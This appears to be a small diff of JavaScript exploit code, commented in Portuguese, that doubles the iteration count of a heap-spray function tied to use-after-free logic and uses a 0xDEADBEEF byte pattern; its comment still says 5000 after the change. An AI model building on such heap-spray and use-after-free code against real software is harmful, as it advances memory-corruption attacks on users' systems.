@@ -5,7 +5,7 @@ let uafCoreLogicHasRun = false; // Flag para controlar a execução da lógica p
 
 function heapSpray() {
   let spray = [];
-  const sprayIterations = 5000; // Mantendo em 5000 por enquanto
+  const sprayIterations = 10000; // Mantendo em 5000 por enquanto
   // Novo padrão de bytes para o spray
   const sprayPattern = [0xDE, 0xAD, 0xBE, 0xEF]; 
   
